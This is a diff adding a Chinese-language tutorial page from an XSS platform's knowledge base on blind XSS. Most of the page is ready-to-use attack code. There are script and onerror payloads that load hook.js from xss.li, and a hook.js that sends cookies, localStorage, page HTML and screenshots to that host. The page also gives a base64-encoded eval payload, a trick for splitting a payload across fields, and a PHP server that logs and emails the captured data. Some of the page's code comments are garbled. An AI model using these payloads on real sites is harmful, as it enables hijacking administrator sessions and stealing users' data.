@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="shortcut icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="apple-touch-icon" href="../tu/xssicon.png">
+    
+<meta name="description" content="盲XSS攻击技术深度解析，包括检测方法、Payload构造、平台搭建及实战案例。掌握后台管理系统XSS挖掘技巧。">
+<meta name="keywords" content="盲XSS,Blind XSS,XSS Hunter,XSS平台,后台XSS,延迟XSS,Web安全">
+<title>盲XSS(Blind XSS)攻击技术详解 - XSS安全知识库</title>
+<link href="../static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet"><link href="../static/libs/fontawesome/css/all.min.css" rel="stylesheet"><link href="../static/css/style.css" rel="stylesheet"><link href="../static/libs/prism/css/prism-tomorrow.min.css" rel="stylesheet">
+<style>.header{background:linear-gradient(135deg,#1a1a2e,#16213e);padding:3rem 0;border-bottom:2px solid #00ff41}.content{max-width:900px;margin:2rem auto;padding:2rem;background:rgba(0,0,0,0.3);border-radius:8px;line-height:1.8}h2{color:#00ff41;margin-top:2.5rem;padding-bottom:0.5rem;border-bottom:2px solid rgba(0,255,65,0.3)}pre{background:rgba(0,0,0,0.5);padding:1.5rem;border-radius:8px;border-left:3px solid #00ff41;overflow-x:auto}.tip{background:rgba(0,123,255,0.1);border-left:4px solid #007bff;padding:1rem;margin:1.5rem 0}        
+        /* 鍥炲埌椤堕儴鎸夐挳 */
+        .back-to-top {
+            position: fixed;
+            bottom: 40px;
+            right: 40px;
+            width: 50px;
+            height: 50px;
+            background: var(--neon-green);
+            color: #000;
+            border: none;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            cursor: pointer;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0, 255, 65, 0.3);
+        }
+        
+        .back-to-top:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.5);
+        }
+        
+        .back-to-top.show {
+            opacity: 1;
+            visibility: visible;
+        }
+    </style>
+</head>
+<body>
+<div class="container"><nav aria-label="breadcrumb"><ol class="breadcrumb" style="background:transparent;padding:1rem 0"><li class="breadcrumb-item"><a href="../index.html" style="color:#00ff41">首页</a></li><li class="breadcrumb-item"><a href="../wiki.html" style="color:#00ff41">知识库</a></li><li class="breadcrumb-item active">盲XSS攻击</li></ol></nav></div>
+<div class="header"><div class="container text-center"><h1 style="font-size:2.5rem;color:#fff"><i class="fas fa-eye-slash"></i> 盲XSS(Blind XSS)攻击技术详解</h1><div style="color:#999"><span><i class="far fa-clock"></i> 15分钟</span> | <span><i class="fas fa-tag"></i> 高级技巧</span></div></div></div>
+<div class="container"><div class="content">
+<h2><i class="fas fa-question-circle"></i> 一、什么是盲XSS</h2>
+<p>盲XSS(Blind XSS)是指攻击者提交恶意Payload后，无法立即在当前页面看到执行结果，而是在管理员访问后台或其他页面时触发的XSS攻击。</p>
+<h3>1.1 盲XSS的特点</h3>
+<ul><li>延迟触发：可能数小时甚至数天后才执行</li><li>隐蔽性强：攻击者无法直接观察到结果</li><li>高危害性：通常在后台管理系统触发</li><li>需要监控：必须搭建接收平台</li></ul>
+<h3>1.2 常见触发场景</h3>
+<pre><code class="language-javascript">// 场景1：用户留言被管理员查看
+用户提交: &lt;script src="https://xss.li/blind.js"&gt;&lt;/script&gt;
+管理员打开后台查看留言 → 触发XSS
+
+// 场景2：订单备注
+客户填写订单备注包含Payload
+商家在后台查看订单 → 触发XSS
+
+// 场景3：日志系统
+User-Agent中注入Payload
+运维人员查看日志 → 触发XSS</code></pre>
+
+<h2><i class="fas fa-code"></i> 二、盲XSS Payload构造</h2>
+<h3>2.1 基础盲XSS Payload</h3>
+<pre><code class="language-javascript">// 远程加载脚本
+&lt;script src="https://xss.li/hook.js"&gt;&lt;/script&gt;
+
+// 图片标签
+&lt;img src=x onerror="var s=document.createElement('script');s.src='https://xss.li/hook.js';document.body.appendChild(s)"&gt;
+
+// 使用noscript绕过某些过滤
+&lt;noscript&gt;&lt;/noscript&gt;&lt;script src="https://xss.li/hook.js"&gt;&lt;/script&gt;</code></pre>
+
+<h3>2.2 完整的盲XSS Payload</h3>
+<pre><code class="language-javascript">// hook.js 内容
+(function(){
+  var data = {
+    url: document.location.href,
+    cookie: document.cookie,
+    html: document.documentElement.outerHTML,
+    localStorage: JSON.stringify(localStorage),
+    userAgent: navigator.userAgent,
+    timestamp: new Date().toISOString()
+  };
+  
+  // 发送数据到攻击者服务器
+  fetch('https://xss.li/api/blind-report', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: JSON.stringify(data)
+  });
+  
+  // 截图（如果支持）
+  if(typeof html2canvas !== 'undefined'){
+    html2canvas(document.body).then(canvas =&gt; {
+      canvas.toBlob(blob =&gt; {
+        const formData = new FormData();
+        formData.append('screenshot', blob);
+        fetch('https://xss.li/api/screenshot', {
+          method: 'POST',
+          body: formData
+        });
+      });
+    });
+  }
+})();</code></pre>
+
+<h3>2.3 多协议盲XSS</h3>
+<pre><code class="language-markup">&lt;!-- HTTP/HTTPS双协议支持 --&gt;
+&lt;script src="//xss.li/hook.js"&gt;&lt;/script&gt;
+
+&lt;!-- 使用Data URI --&gt;
+&lt;script src="data:text/javascript,fetch('https://xss.li/report?url='+encodeURIComponent(location.href))"&gt;&lt;/script&gt;</code></pre>
+
+<h2><i class="fas fa-server"></i> 三、盲XSS平台搭建</h2>
+<h3>3.1 简易接收服务器(PHP)</h3>
+<pre><code class="language-php">&lt;?php
+// blind-report.php
+header('Access-Control-Allow-Origin: *');
+header('Content-Type: application/json');
+
+$data = json_decode(file_get_contents('php://input'), true);
+$logFile = 'blind_xss_' . date('Y-m-d') . '.log';
+
+file_put_contents($logFile, 
+  date('[Y-m-d H:i:s] ') . json_encode($data, JSON_PRETTY_PRINT) . PHP_EOL,
+  FILE_APPEND
+);
+
+// 发送邮件通知
+mail('your@email.com', 'Blind XSS Triggered!', json_encode($data));
+
+echo json_encode(['status' => 'ok']);
+?&gt;</code></pre>
+
+<h3>3.2 使用XSS Hunter</h3>
+<p>XSS Hunter是专门用于盲XSS的开源平台：</p>
+<pre><code class="language-javascript">// 注册XSS Hunter账号后使用提供的Payload
+&lt;script src="https://your-username.xss.ht"&gt;&lt;/script&gt;</code></pre>
+
+<h3>3.3 使用本平台</h3>
+<p>蓝莲花XSS平台提供完整的盲XSS监控功能：</p>
+<ul><li>自动记录触发时间和环境</li><li>截图功能</li><li>邮件/Telegram通知</li><li>详细的上下文信息</li></ul>
+
+<h2><i class="fas fa-search"></i> 四、盲XSS挖掘技巧</h2>
+<h3>4.1 寻找注入点</h3>
+<ul><li>用户反馈/留言系统</li><li>订单备注字段</li><li>支持工单系统</li><li>简历上传系统</li><li>日志记录（User-Agent、Referer）</li><li>文件名/文件元数据</li><li>API错误信息</li></ul>
+
+<h3>4.2 绕过技巧</h3>
+<pre><code class="language-javascript">// 使用多层编码
+&lt;img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHBzOi8veHNzLmxpJyk='))"&gt;
+
+// 分段注入
+在多个字段中分别注入：
+字段1: &lt;script&gt;
+字段2: var s=document.createElement('script');
+字段3: s.src='https://xss.li/hook.js';document.body.appendChild(s)
+字段4: &lt;/script&gt;</code></pre>
+
+<div class="tip"><h4><i class="fas fa-lightbulb"></i> 实战建议</h4>
+<p>1. 使用唯一标识：在Payload中加入唯一ID以区分不同测试点<br>
+2. 耐心等待：盲XSS可能需要数天才触发<br>
+3. 多点布局：在所有可能的输入点都尝试<br>
+4. 保持低调：避免破坏性Payload</p></div>
+
+<h2><i class="fas fa-book"></i> 五、真实案例</h2>
+<h3>5.1 Shopify盲XSS($500赏金)</h3>
+<p>研究员在商店名称字段注入盲XSS，当Shopify员工查看商店信息时触发，获得管理员Cookie。</p>
+
+<h3>5.2 Facebook盲XSS</h3>
+<p>通过在页面名称中注入，当Facebook审核人员查看待审核页面时触发。</p>
+
+<h2><i class="fas fa-graduation-cap"></i> 总结</h2>
+<p>盲XSS是高级XSS技术，需要：</p>
+<ol><li>搭建可靠的监控平台</li><li>耐心等待触发</li><li>覆盖所有可能的输入点</li><li>遵守负责任披露原则</li></ol>
+
+<div style="display:flex;justify-content:space-between;margin-top:3rem;padding-top:2rem;border-top:1px solid #333">
+<a href="csp-guide.html" style="color:#00ff41;text-decoration:none"><i class="fas fa-arrow-left"></i> 上一篇</a>
+<a href="../wiki.html" style="color:#00ff41;text-decoration:none">返回知识库</a>
+<a href="mutation-xss.html" style="color:#00ff41;text-decoration:none">下一篇 <i class="fas fa-arrow-right"></i></a>
+</div>
+</div></div>
+<footer class="footer"><div class="container-fluid"><div style="text-align:center;color:#999">© 2025 蓝莲花XSS平台 | <a href="../index.html" style="color:#00ff41">返回首页</a></div></div></footer>    
+    <!-- 鍥炲埌椤堕儴鎸夐挳 -->
+    <button class="back-to-top" id="backToTop">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+    
+<script src="../static/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
+<script src="../static/libs/prism/js/prism.min.js"></script>    <script>
+        // 鍥炲埌椤堕儴鍔熻兘
+        const backToTopBtn = document.getElementById('backToTop');
+        window.addEventListener('scroll', function() {
+            if (window.pageYOffset > 300) {
+                backToTopBtn.classList.add('show');
+            } else {
+                backToTopBtn.classList.remove('show');
+            }
+        });
+        backToTopBtn.addEventListener('click', function() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+    </script>
+</body></html>
